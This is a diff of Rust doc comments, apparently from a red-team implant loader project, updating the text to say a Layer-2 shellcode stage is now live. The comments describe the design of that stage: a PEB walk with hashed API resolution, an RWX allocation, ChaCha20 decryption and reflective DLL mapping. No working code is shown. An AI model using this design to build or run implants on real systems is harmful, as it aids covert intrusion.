@@ -1,13 +1,16 @@
 //! Raw x86-64 PIC loader stub shellcode (Layer 1), plus the host-side
 //! reflective PE loader used to verify and exercise the mapping logic.
 //!
-//! **Loader status: Layer 2 is NOT implemented.** The on-target "Layer 2"
+//! **Loader status: Layer 2 is live.** The on-target "Layer 2"
 //! decrypt + reflective load sequence (PEB walk, RWX alloc, inline
-//! ChaCha20-Poly1305 decrypt, reflective PE map, `DllMain` call) does not
-//! exist yet — the previous `LAYER2_PEB_WALK` byte blob was a non-functional
-//! placeholder and was deleted. [`crate::generate_loader_stub`] fails loudly
-//! with `LoaderError::Layer2Unavailable` until a real Layer-2 lands (spec
-//! §5.3). Loading verification on the engagement box is *additionally* done
+//! ChaCha20-Poly1305 decrypt, reflective PE map, `DllMain` call) ships as the
+//! `nyx-pic-loader` crate, compiled to a raw PIC binary and embedded via
+//! [`crate::on_target::LAYER2_CODE`] (the previous `LAYER2_PEB_WALK` byte blob
+//! was a non-functional placeholder and was deleted).
+//! [`crate::generate_loader_stub`] emits `[LAYER1_BOOTSTRAP][key 32B]` and
+//! [`crate::wrap_payload`] appends the NYX2 header, the ciphertext, and the
+//! Layer-2 blob (spec §5.3). Loading verification on the engagement box is
+//! *additionally* done
 //! host-side via [`crate::dll_probe`] — `LoadLibraryW` the built implant DLL
 //! and enumerate its `nyx_selftest_*` exports — which remains as a
 //! host-side sanity check alongside the live loader-probe gate.
@@ -18,10 +21,12 @@
 //!    bytes representing the **historical** Layer-1-only stub (self-locate,
 //!    NYX2 scan, header parse, trampoline-register ABI). It is retained as a
 //!    byte-stable reference of the original 50-byte Layer-1 design and is
-//!    unit-tested below. The **production** stub, once Layer 2 exists, is
+//!    unit-tested below. The **production** stub is
 //!    emitted by [`crate::generate_loader_stub`] as the Layer-1 prefix
-//!    ([`crate::on_target::LAYER1_BOOTSTRAP`]) + per-config key + Layer-2
-//!    sequence; `PIC_STUB` itself is no longer placed into generated payloads
+//!    ([`crate::on_target::LAYER1_BOOTSTRAP`]) + per-config key, with the
+//!    Layer-2
+//!    sequence appended after the ciphertext by [`crate::wrap_payload`];
+//!    `PIC_STUB` itself is no longer placed into generated payloads
 //!    but documents the self-location + scan + header-parse contract that the
 //!    production Layer-1 prefix implements.
 //!
@@ -58,12 +63,11 @@
 /// x86-64 representing the original Layer-1-only design.
 ///
 /// **This constant is no longer placed into generated payloads.** The
-/// production stub (once Layer 2 exists) is the Layer-1 prefix in
+/// production stub is the Layer-1 prefix in
 /// [`crate::on_target::LAYER1_BOOTSTRAP`] followed by the per-config
-/// 32-byte key and the Layer-2 decrypt-and-reflect shellcode (see
-/// [`crate::on_target`]); [`crate::generate_loader_stub`] currently fails
-/// with `LoaderError::Layer2Unavailable` because that Layer-2 does not exist
-/// yet. `PIC_STUB` is retained here as a
+/// 32-byte key (the Layer-2 decrypt-and-reflect shellcode is appended after
+/// the ciphertext by [`crate::wrap_payload`]; see
+/// [`crate::on_target`]). `PIC_STUB` is retained here as a
 /// byte-stable reference of the self-location + scan + header-parse contract
 /// (its byte-level tests pin that contract) and as documentation of the
 /// trampoline-register ABI that Layer 1 hands off to Layer 2.
@@ -582,21 +586,22 @@ fn resolve_imports(
 // target) lives in [`crate::on_target`]. That module holds:
 //
 //   * `LAYER1_BOOTSTRAP` — the production Layer-1 prefix (self-locate, NYX2
-//     scan, header parse, PEB-walk hand-off). It replaces the historical
-//     `PIC_STUB` retained above as a byte-stable reference.
-//   * *(Layer-2 shellcode — NOT implemented.)* When it exists it will be the
-//     Layer-2 PIC shellcode: PEB walk to resolve
+//     scan, header parse, bridge to the pic-loader Win64 entry ABI). It
+//     replaces the historical `PIC_STUB` retained above as a byte-stable
+//     reference.
+//   * `LAYER2_CODE` — the raw pic-loader PIC shellcode: PEB walk to resolve
 //     `kernel32!{VirtualAlloc,LoadLibraryA,GetProcAddress}` by djb2 hash,
-//     RWX allocation, inline ChaCha20-Poly1305 decrypt (key baked into the
-//     stub at `KEY_PATCH_OFFSET`, nonce read from the NYX2 header), reflective
-//     PE map (sections + DIR64 relocs + IAT), then
+//     RWX allocation, inline ChaCha20-Poly1305 decrypt (key pointed to by
+//     the bridge at `KEY_PATCH_OFFSET`, nonce read from the NYX2 header),
+//     reflective PE map (sections + DIR64 relocs + IAT), then
 //     `DllMain(base, DLL_PROCESS_ATTACH, NULL)`.
 //   * `find_magic_offset` — the pure host-side model of the Layer-1 scan loop,
 //     extracted for unit testing without a Windows target.
 //
-// Layer 1 + the per-config 32-byte key + Layer 2 are stitched into the final
-// blob by [`crate::generate_loader_stub`] **once Layer 2 exists** (today that
-// function fails loudly with `LoaderError::Layer2Unavailable`); the host-side
+// Layer 1 + the per-config 32-byte key are stitched into the stub by
+// [`crate::generate_loader_stub`]; [`crate::wrap_payload`] appends the NYX2
+// header, the ciphertext, and `LAYER2_CODE`, and patches the Layer-1 jmp to
+// the Layer-2 entry. The host-side
 // reference loader `reflective_load_at` above remains the testable algorithm
 // reference. The host-side [`crate::dll_probe`] is retained as a host-side
 // sanity check alongside the live VPS loader-probe gate (spec §5.5).
